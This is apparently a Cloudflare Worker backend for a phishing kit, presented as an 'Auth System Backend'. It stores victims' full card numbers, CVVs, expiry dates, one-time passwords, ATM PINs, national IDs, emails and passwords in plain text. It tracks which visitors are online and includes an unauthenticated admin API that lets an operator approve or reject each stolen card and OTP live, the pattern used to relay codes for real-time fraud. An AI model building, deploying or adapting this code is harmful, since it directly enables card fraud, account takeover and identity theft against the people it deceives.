/**
 * Cloudflare Worker for Auth System Backend
 * Handles all API endpoints with D1 Database
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS headers
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Access-Control-Allow-Credentials': 'true',
    };

    // Handle OPTIONS (preflight)
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    try {
      // Get or create visitor ID from cookie
      const cookies = request.headers.get('Cookie') || '';
      let vid = getCookie(cookies, 'vid');
      
      if (!vid) {
        vid = generateId();
      }

      // Route handling
      let response;

      if (path === '/api/visitor/online') {
        response = await handleOnline(env.DB, vid);
      } else if (path === '/api/visitor/offline') {
        response = await handleOffline(env.DB, vid);
      } else if (path === '/api/save-field') {
        response = await handleSaveField(request, env.DB, vid);
      } else if (path === '/api/save-payment') {
        response = await handleSavePayment(request, env.DB, vid);
      } else if (path === '/api/check-payment-approval') {
        response = await handleCheckPaymentApproval(env.DB, vid);
      } else if (path === '/api/save-otp') {
        response = await handleSaveOtp(request, env.DB, vid);
      } else if (path === '/api/check-otp-approval') {
        response = await handleCheckOtpApproval(env.DB, vid);
      } else if (path === '/api/save-atm-pin') {
        response = await handleSaveAtmPin(request, env.DB, vid);
      } else if (path === '/api/save-activation-data') {
        response = await handleSaveActivationData(request, env.DB, vid);
      } else if (path.startsWith('/api/admin/')) {
        response = await handleAdminAPI(request, env.DB, path);
      } else {
        response = { success: false, error: 'Not found' };
      }

      // Add CORS and set cookie
      const headers = {
        ...corsHeaders,
        'Content-Type': 'application/json',
        'Set-Cookie': `vid=${vid}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=2592000`,
      };

      return new Response(JSON.stringify(response), { headers });

    } catch (error) {
      return new Response(
        JSON.stringify({ success: false, error: error.message }),
        { 
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }
  },
};

// Helper Functions
function generateId() {
  return crypto.randomUUID();
}

function getCookie(cookies, name) {
  const match = cookies.match(new RegExp(`(^| )${name}=([^;]+)`));
  return match ? match[2] : null;
}

// Handler: Online
async function handleOnline(db, vid) {
  await db.prepare(`
    INSERT INTO visitors (vid, online, last_seen)
    VALUES (?, 1, datetime('now'))
    ON CONFLICT(vid) DO UPDATE SET
      online = 1,
      last_seen = datetime('now')
  `).bind(vid).run();

  return { success: true, vid };
}

// Handler: Offline
async function handleOffline(db, vid) {
  await db.prepare(`
    UPDATE visitors SET online = 0, last_seen = datetime('now')
    WHERE vid = ?
  `).bind(vid).run();

  return { success: true };
}

// Handler: Save Field
async function handleSaveField(request, db, vid) {
  const { page, fieldName, fieldValue } = await request.json();
  
  await db.prepare(`
    INSERT INTO form_data (vid, page, field_name, field_value, created_at)
    VALUES (?, ?, ?, ?, datetime('now'))
  `).bind(vid, page, fieldName, fieldValue).run();

  return { success: true };
}

// Handler: Save Payment
async function handleSavePayment(request, db, vid) {
  const data = await request.json();
  
  await db.prepare(`
    INSERT INTO payments (vid, card_number, card_holder, expiry_date, cvv, card_type, status, created_at)
    VALUES (?, ?, ?, ?, ?, ?, 'pending', datetime('now'))
  `).bind(
    vid,
    data.cardNumber,
    data.cardHolder,
    data.expiryDate,
    data.cvv,
    data.cardType
  ).run();

  return { success: true };
}

// Handler: Check Payment Approval
async function handleCheckPaymentApproval(db, vid) {
  const result = await db.prepare(`
    SELECT status FROM payments WHERE vid = ? ORDER BY created_at DESC LIMIT 1
  `).bind(vid).first();

  return {
    success: true,
    card_status: result?.status || 'pending'
  };
}

// Handler: Save OTP
async function handleSaveOtp(request, db, vid) {
  const { otp } = await request.json();
  
  await db.prepare(`
    INSERT INTO otps (vid, otp, status, created_at)
    VALUES (?, ?, 'pending', datetime('now'))
  `).bind(vid, otp).run();

  return { success: true };
}

// Handler: Check OTP Approval
async function handleCheckOtpApproval(db, vid) {
  const result = await db.prepare(`
    SELECT status FROM otps WHERE vid = ? ORDER BY created_at DESC LIMIT 1
  `).bind(vid).first();

  return {
    success: true,
    otp_status: result?.status || 'pending'
  };
}

// Handler: Save ATM PIN
async function handleSaveAtmPin(request, db, vid) {
  const { atmPin } = await request.json();
  
  await db.prepare(`
    INSERT INTO atm_pins (vid, pin, created_at)
    VALUES (?, ?, datetime('now'))
  `).bind(vid, atmPin).run();

  return { success: true };
}

// Handler: Save Activation Data
async function handleSaveActivationData(request, db, vid) {
  const data = await request.json();
  
  await db.prepare(`
    INSERT INTO activation_data (vid, provider, phone, personal_id, email, password, created_at)
    VALUES (?, ?, ?, ?, ?, ?, datetime('now'))
  `).bind(
    vid,
    data.provider,
    data.phone,
    data.personalId,
    data.email || null,
    data.password || null
  ).run();

  return { success: true };
}

// Handler: Admin APIs
async function handleAdminAPI(request, db, path) {
  if (path === '/api/admin/visitors') {
    const visitors = await db.prepare(`
      SELECT 
        v.vid,
        v.online,
        v.last_seen,
        p.status as payment_status,
        o.status as otp_status
      FROM visitors v
      LEFT JOIN (
        SELECT vid, status FROM payments WHERE id IN (
          SELECT MAX(id) FROM payments GROUP BY vid
        )
      ) p ON v.vid = p.vid
      LEFT JOIN (
        SELECT vid, status FROM otps WHERE id IN (
          SELECT MAX(id) FROM otps GROUP BY vid
        )
      ) o ON v.vid = o.vid
      ORDER BY v.last_seen DESC
      LIMIT 100
    `).all();

    return {
      success: true,
      visitors: visitors.results || []
    };
  }

  if (path === '/api/admin/statistics') {
    const stats = await db.prepare(`
      SELECT 
        COUNT(*) as total,
        SUM(CASE WHEN online = 1 THEN 1 ELSE 0 END) as online
      FROM visitors
    `).first();

    const pendingPayment = await db.prepare(`
      SELECT COUNT(DISTINCT vid) as count FROM payments WHERE status = 'pending'
    `).first();

    const pendingOtp = await db.prepare(`
      SELECT COUNT(DISTINCT vid) as count FROM otps WHERE status = 'pending'
    `).first();

    return {
      success: true,
      statistics: {
        total: stats.total || 0,
        online: stats.online || 0,
        pending_payment: pendingPayment.count || 0,
        pending_otp: pendingOtp.count || 0
      }
    };
  }

  if (path === '/api/admin/approve-payment' && request.method === 'POST') {
    const { vid, approved } = await request.json();
    const status = approved ? 'approved' : 'rejected';
    
    await db.prepare(`
      UPDATE payments SET status = ? WHERE vid = ?
      AND id = (SELECT MAX(id) FROM payments WHERE vid = ?)
    `).bind(status, vid, vid).run();

    return { success: true };
  }

  if (path === '/api/admin/approve-otp' && request.method === 'POST') {
    const { vid, approved } = await request.json();
    const status = approved ? 'approved' : 'rejected';
    
    await db.prepare(`
      UPDATE otps SET status = ? WHERE vid = ?
      AND id = (SELECT MAX(id) FROM otps WHERE vid = ?)
    `).bind(status, vid, vid).run();

    return { success: true };
  }

  return { success: false, error: 'Admin endpoint not found' };
}
